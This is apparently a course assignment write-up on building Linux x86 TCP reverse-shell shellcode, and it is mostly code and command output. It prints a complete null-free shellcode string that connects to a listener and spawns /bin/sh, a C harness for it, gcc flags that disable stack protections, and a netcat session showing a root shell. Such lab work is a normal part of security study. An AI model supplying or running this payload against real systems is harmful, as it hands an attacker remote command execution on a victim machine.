# Assignment 2: Linux x86 TCP Reverse Shell

To generate the shellcode, run the python wrapper script `tcp_reverse_shell_x86.py` and supply alistening host and port:

```bash
python3 tcp_reverse_shell_x86.py -l 192.168.105.151 -p 4444
[*] Generating shellcode for x86 TCP reverse shell on 192.168.105.151:4444
[*] Shellcode length: 104 bytes
[*] Checking for NULL bytes...
[+] No NULL bytes detected!
"\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x31\xd2\x89\xc2\x31\xc0\xb0\x66\x31\xdb\xb3\x03\x31\xff\xbf\x3f\x57\x96\x68\x83\xf7\xff\x31\xc9\x57\x66\x68\x11\x5c\x66\x6a\x02\x89\xe6\x6a\x10\x56\x52\x89\xe1\xcd\x80\x52\xb0\x3f\x5b\x31\xc9\xcd\x80\xb0\x3f\xb1\x01\xcd\x80\xb0\x3f\xb1\x02\xcd\x80\xb0\x0b\x31\xdb\x53\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xcd\x80"
```

Copy the shellcode output and paste into the `code` variable of `shellcode.c`:

```C
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x31\xd2\x89\xc2\x31\xc0\xb0\x66\x31\xdb\xb3\x03\x31\xff\xbf\x3f\x57\x96\x68\x83\xf7\xff\x31\xc9\x57\x66\x68\x11\x5c\x66\x6a\x02\x89\xe6\x6a\x10\x56\x52\x89\xe1\xcd\x80\x52\xb0\x3f\x5b\x31\xc9\xcd\x80\xb0\x3f\xb1\x01\xcd\x80\xb0\x3f\xb1\x02\xcd\x80\xb0\x0b\x31\xdb\x53\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xcd\x80";
...
```

Compile the shellcode using gcc:

```bash
gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
```

Start a netcat listener on the remote host:

```bash
nc -nlvp 4444                                                                                                                           1 ⨯
listening on [any] 4444 ...
```

Run the compiled binary:

```bash
./shellcode 
Shellcode Length: 116
```

Connect to the reverse shell over the chosen port using netcat:

```bash
nc -nlvp 4444                                  
listening on [any] 4444 ...
connect to [192.168.105.151] from (UNKNOWN) [192.168.105.151] 46240
hostname
kali
whoami
root
id
uid=0(root) gid=0(root) groups=0(root)
```

---
